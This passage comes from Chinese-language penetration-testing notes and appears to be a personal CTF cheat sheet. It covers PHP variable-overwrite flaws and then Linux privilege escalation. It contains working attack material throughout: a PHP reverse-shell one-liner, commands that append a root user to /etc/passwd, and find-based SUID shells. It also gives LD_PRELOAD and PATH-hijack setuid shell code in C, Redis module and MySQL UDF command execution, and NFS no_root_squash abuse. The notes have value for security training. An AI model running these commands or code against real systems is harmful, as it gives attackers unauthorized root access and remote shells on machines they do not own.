    echo $name."<br>";
    echo $age;
  ?>
  //xiaohua
  //22

# 动态变量覆盖
  <?php
    $bar= "a";
    $Foo="Bar";
    $World="Foo";
    $Hello="world";
    $a="Hello";

    echo $a; //hello
    echo $$a; //world
    echo $$$a; //foo
    echo $$$$$a; //Bar
    echo $$$$$$a; //a
    echo $$$$$$$a; //hello
    echo $$$$$$$$a; //world
  ?>	

# import_request_variables ( string $types [, string $prefix ] ) : bool (PHP 4 >= 4.1.0, PHP 5 < 5.4.0)
  <?php
    $num=0;
    //include 'flag.php';
    import_request_variables('gp'); //导入get和post中变量

    if($num=="xiaohua"){
        echo 'flag{ xiaohua-2020-3-28}';
        // echo $flag.php;
    }else{
        echo "NO!";
    }
  ?> 
  //payload：http://127.0.0.1/test.php?num=xiaohua
  //flag{ xiaohua-2020-3-28}

# register_globals() ( < PHP 5.3 ) 
  <?php
    if ($num){
       echo "flag{xiaohua-2020-3-28}";
    }
  ?> 
  //payload：http://127.0.0.1/test.php?num=1
  //flag{xiaohua-2020-3-28}
```

## 反弹shell php
```plain
靶机开启监听：nc -lvvp 2333
服务器执行：php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

# 内网提权
## 【注】当提权不了时尝试切换任何用户，例如 /home 目录以及CMS提权到 www-data，或者查看可写入的有root权限文件将他弹出去
## 提权 信息搜集
```plain
# hostname
  查看计算机名，类似linux-dasd12e

# 查看系统信息，主题信息
  /etc/issue

# 查看系统内核版本
  uname -a 
  /proc/version 进程文件信息包含了系统信息

# 查看进程
  ps 有时候提权可以看到哪些进程是以root权限进行的，也可以看到哪些服务
  查看到详细 ps -aux

# 环境变量
  env 查看到系统环境变量，有时候可以看到有哪些编译器，比如path中含有python之类的，运行代码进行提权

# 查看到自己的用户信息
  id 查看到当前用户的用户组等信息
    # /etc/passwd
    # /etc/shadow
    # /home
  查看到系统用户信息，以及其bash
  可以尝试自己爆破

# history
  查看到命令输入历史

# ifconfig
  查看通往信息 
  ip route 可以看到具体通往信息
  
# netstat
  查看开启的网络服务 
```

## 提权 内核提权
```plain
# hostname
  查看计算机名

# 查看系统信息
  cat /etc/issue

# 查看系统内核
  unmae -a 
  cat /proc/version
  lsb_release -a # 如果命令中有的话

# searchsploit 查询exp
  searchsploit 系统内核名字 版本名 
```

## 提权 定时任务
```plain
# 当发现定时任务有root权限时可以尝试
  vim /etc/crontab	*/1 * * * * 执行命令(可为python脚本或者bash脚本，如:python change_passwd.py)

  定时任务一般会写入反弹shell，防止破坏系统，同时可以查看执行的sh脚本，写入自己的脚本
  * * * * *  root /home/karen/backup.sh
```

## 提权 /etc/passwd 提权
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722530390292-80a04544-f053-41e1-a55d-ddafd18eb510.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/jpeg/35229002/1722530379772-dba35fa7-5b97-4dde-80ab-6ba793942af5.jpeg)

密码生成：

```plain
#利用openssl生成加密的密码, 语法：openssl passwd-1-salt[salt value]password
openssl passwd -1 -salt user3 pass123
 
#mkpasswd类似于openssl passwd，它将生成指定密码字符串的哈希值。
mkpasswd -m SHA-512 pass
 
#利用python中的crypt库生成
python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
 
#利用Perl和crypt来使用salt值为我们的密码生成哈希值
perl -le 'print crypt("pass123", "abc")'
 
#php语言
php -r "print(crypt('aarti','123') . " ");"
```

举例：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722531071844-f33a09d1-1f74-424c-b8ce-c97e3f3fd930.png)

```plain
echo "test:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >>/etc/passwd
```

## 提权 SUID 和 SUDO（find 命令，sudo切换用户）
```plain
# 查找到 SUID命令 和 SUDO 即可尝试提权
  https://gtfobins.github.io/
  
# SUDO 原理：以SUDO运行时，不需要知道root密码，并搭配以 SHELL 命令即可拿到 root 用户
# 【建议】不要拿系统命令作为命令执行！！！
# 【建议】尝试一些可以shell的命令，但不要是系统命令
# sudo -l
  可以查看到不用密码且以root权限的命令，当存在root权限时，可以使用 sudo + 命令进行提权

# sudo -u
  以指定用户运行文件

# /bin/usr/sudo
  /bin/usr/sudo 可以查看可执行与不可执行的命令

# SUID 原理：一种存在于linux的特殊权限可以以root用户身份临时运行命令
# 当存在一些较为搞权限的命令时，可以通过此命令执行其他命令
  find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; # 查询具有root权限的命令
  find / -type f -perm -04000 -ls 2>/dev/null
  find / -type f -perm -4000  -ls 2>/null/dev
  find / -uid 0 -perm -4000 -type f 2>/dev/null
  find / -perm -u=s 2>/dev/null  查看可执行文件

# 几个命令的提权：
  find . -exec /bin/sh -p \; -quit，返回shell，可见该进程euid为root，可以读取shadow文件，提权成功！

# 补充 find 命令参数
  * find / -type f -perm 0777：查找具有 777 权限的文件 （所有用户可读、可写和可执行的文件）
  * find / -type d -name config：在“/”下找到名为config的目录
  find . -name flag1.txtflag1.txt：在 当前目录
  find /home -name flag1.txt：找到文件名“flag1.txt” /home 目录
  find / -perm a=x：查找可执行文件
  find /home -user frank：在“Frank”下查找用户“Frank”的所有文件 “/主页”
  find / -mtime 10：查找最近 10 个中修改的文件 日
  find / -atime 10：查找最近 10 个访问过的文件 日
  find / -cmin -60：查找过去一小时内更改的文件 （60 分钟）
  find / -amin -60：查找过去一小时内访问的文件 （60 分钟）
  find / -size 50M：查找大小为 50 MB 的文件

  -perm权限说明：
    每个文件有：
    SUID：当设置了SUID位并且该文件是一个可执行文件时，执行该文件的用户将临时获得文件所有者的权限。SUID位的八进制值是4000
    SGID：当设置了SGID位并且该文件是一个可执行文件时，执行该文件的用户将临时获得文件所属组的权限。SGID位的八进制值是2000。如果是一个目录，新的文件将继承目录的组权限。
    Stickey：当设置了Sticky位并且该文件是一个目录时，只有文件的所有者、目录的所有者或root用户可以删除或修改目录内的文件。Sticky位的八进制值是1000。
    所有者权限
    成员组权限
    其他用户权限
    
    比如-4000：
    -表示缺1不可，比如 100 至少都是 100
    +表示有1即可，比如 110 ，100 010 110 都可
    第一位 4 表示设置了SUID位。
    第二位 7 表示所有者的权限：读（4）+ 写（2）+ 执行（1）= 7。
    第三位 5 表示组成员的权限：读（4）+ 执行（1）= 5。
    第四位 5 表示其他用户的权限：读（4）+ 执行（1）= 5。
    
    755：
    第二位 7 表示所有者的权限：读（4）+ 写（2）+ 执行（1）= 7。即二进制 111 等效 rwx
    第三位 5 表示组成员的权限：读（4）+ 执行（1）= 5。即 101 等效 r-x
    第四位 5 表示其他用户的权限：读（4）+ 执行（1）= 5。即 101 等效 r-x
```

## 提权 capabilities
```plain
capabilities 一个linux系统可以精细化控制进程权限的概念，Linux 系统中主要提供了两种工具来管理 capabilities：libcap 和 libcap-ng。libcap 提供了 getcap 和 setcap 两个命令来分别查看和设置文件的 capabilities，同时还提供了 capsh 来查看当前 shell 进程的 capabilities。libcap-ng 更易于使用，使用同一个命令 filecap 来查看和设置 capabilities
可以简略认为是一个 root 权限分配机制，在运行时有root权限

# 设置cap
  setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap

# 查询cap
  getcap -r / 2>/dev/null
```

## 提权 redis
redis-rogue-server 提权 当服务器开启了redis，且能够链接redis，但是无权限的时候可以尝试

exp.so文件地址 [https://github.com/Dliv3/redis-rogue-server](https://github.com/Dliv3/redis-rogue-server)

将 exp.so 上传到服务器

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD 编辑窗口调试 1.14.71.254 园 1.14.71.254 口文件列表(4) 口目录列表(0) 书签 上层 主目录 新建 C刷新 读取 /VAR/WWW/HTML/ 白口VAR 属性 日期 大小 名称 白 WWW 1970-01-01 00:00:00 NAN B HTML 2021-09-23 13:19:31 0644 12KB CONFIG.PHP.SWP 0644 37.44 KB 2024-06-28 13:25:29 EXP.SO 0664 2021-09-23 06:43:06 635B INDEX.PHP 三任务列表 完成时间 简介 创建时间 状态 名称 上传 上传成功 2024-06-28 21:25:29 2024-06-28  21:25:29 EXP.SO>/WAR/WWW/HTML/ 成功 上传文件成功! EXP.SO -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1719581138728-beabf0d5-3d3b-4e67-ba4f-b94115e761b4.png)

使用 MODULE LOAD 加载exp

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 1.14.71.254 1.14.71.254 配置列表 结果信自 口REDIS虚拟命令行-DB[0] 添加 使用帮助: REDIS://12 SCORE 1)快速按两下[TAB]键自动补全指令; LEGEELLOGELEGELE (0)OQP 2)暂不支持在终端下切换DB; 3)执行命令后可能无法正常返回数据,多尝试几次; DB1(0) 127.0.0.1:6379(0)>MODULE LOAD /VAR/WWW/HTML/EXP.SO 127.0.0.1:6379(0)> DB2(0) DB3(0) DB4(0) DB5(0) (O)9QP DB7(O) DB8(0) (0)6BP 错误 REPLYERROR:ERR ERROR LOADING THE EXTENSION .PLEASE CHECK THE SERVER LOGS. -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1719581310168-26ca4154-37a3-497e-8b18-4a3f5f97ba25.png)

然后 system.exec 即可进行命令执行

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 品 层1.14.71.254 结果信自 配置列表 口REDIS虚拟命令行-DB[0] 添加 使用帮助: REDIS://12 SCORE 1)快速按两下[TAB]键自动补全指令; GLELL00998800 (OO(O) 2)暂不支持在终端下切换DB; 3)执行命令后可能无法正常返回数据,多尝试几次; DB1(0) 127.0.0.1:6379(0)> MODULE LOAD /VAR/WWW/HTML/EXP.SO OK DB2(0) 127.0.0.1:6379(0)>SYSTEM.EXEC DB3(0) BIN BOOT DB4(0) DEV ETC DB5(0) FLAGAA3DBJAN33CTF DB6(0) HOME 1IB DB7(0) 1IB64 MEDIA (0)8GP MNT OPT (O)6BP PROC DB10(C REDIS-5.0.10 ROOT DB11(C RUN RUN.SH SBIN SRV SY8 TMP USR DB15( VAR 127.0.0.1:6379(0)> -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1719581513595-846f2386-b23e-4bdf-aa9c-a80f65827895.png)

## 提权 Mysql UDF
UDF提权原理：当mysql权限较高时，可以尝试 UDF 提权，创建一个mysql函数 用于命令执行

```plain
ps -aux 查看进程中是否有 mysql，如果有且为root权限可以尝试 UDF 提权
# 插件目录可以自己找一下
select unhex('udf.so的16进制') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so'; // 写入文件
create function sys_eval returns string soname 'mysqludf.so';
select sys_eval('');
```

## 提权 LD_PRELOAD 环境变量劫持
提权原理：该环境变量运行有限加载输入的动态加载库，当存在 env_keep += LD_PRELOAD 时，且有 sudo 命令，使用 LD_PRELOAD 提权

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1747405397960-5019922e-dad9-4532-9458-659e50d6468f.png)

c代码

```plain
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

生成 so 文件动态库

```plain
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

设置环境变量

```plain
提权环境：
  sudo LD_PRELOAD=/home/user/ldpreload/shell.so find (find 为 sudo 命令，虽然 ps 无法sudo shell，但是可以 LD_PRELOAD)

普通命令劫持：也可直接输入其他命令进行执行，因为优先级更高，比如输入
  ls find 也可执行为 /bin/bash find
```

## 提权 Path环境变量提权
需要说明：与 LD_PRELOAD 并不完全相同，虽然也是通过环境变量进行劫持

1. PATH路径修改 一个是通过修改 PATH 路径，使其优先级高于其他 /use/bin 下的命令，更加安全可靠，且隐蔽，构造简单
2. LD_PRELOAD 劫持是因为该环境变量优先级高于默认命令，但是会造成全部命令被劫持

```plain
提权原理：本质是环境变量劫持 + SUID，当 env 时，可以看到 env 有个 path 路径，输入echo $path 即可打印环境变量中的 path，
linux 命令会优先在此路径中查找（当然也可以自己 export 一个环境变量上去，可以 export 先看看环境变量），利用 suid 写一个具有root权限的命令并编译可执行文件，直接输入该可执行程序名即可运行

比如有一个SUID文件：假设为python文件，其执行了 system('ls');，那么提权方法就是将系统的 ls 替换成自己的命令，写入一个环境变量 /tmp ，然后写入一个自定义的 ls 命令，然后运行这个python文件，他会运行/tmp/ls文件

# elf文件生成：
  #include <stdio.h>
  void main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
  }

  gcc shell.c -o shell -w
```

## 提权 NFS
```plain
提权原理：
  NFS 是一个网络共享文件
  cat /etc/exports ，如果 存在 no_root_squash ，则共享路径文件会以 root 权限存在
# 服务器 查看共享文件
  cat /etc/exports

# 服务器 手动加载nfs
  systemctl start rpcbind
  systemctl start nfs
  systemctl enable rpcbind
  systemctl enable nfs

# 服务器 查看nfs挂在信息
  showmount --exports 192.168.0.40 

# 本地 创建临时文件夹用于挂在连接临时文件
  mkdir /tmp/shell

# 本地 远程挂载到 服务器 no_root_squash 选项的共享文件（且由于no_root_squash，服务器上该目录会有root权限）
  mount -o rw 10.10.168.193:/backups /tmp/shell

# 本地 生成bash
  注意，必须是cp本地的 /bin/bash 或者 一个 gcc编译的bash，因为如果 echo '/bin/bash' > /tmp/shell/shell 会调用服务器的 /bin/bash，权限还是原来的样子，但是使用自己的bash会让shell变成一个程序而已，且有root权限，一样可以执行命令
  echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/test/suid-shell.c
  gcc suid-shell.c -o shell -w

# 本地 赋权SUID （便于服务器执行和提权）
  chmod 777 /tmp/shell/shell
  chmod +s /tmp/shell/shell

# 服务器
  ./tmp/bash 提权成功
```

## 提权 补充 文件权限组
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722508374131-a8106863-6509-4891-95fd-d7a1736569d8.png)
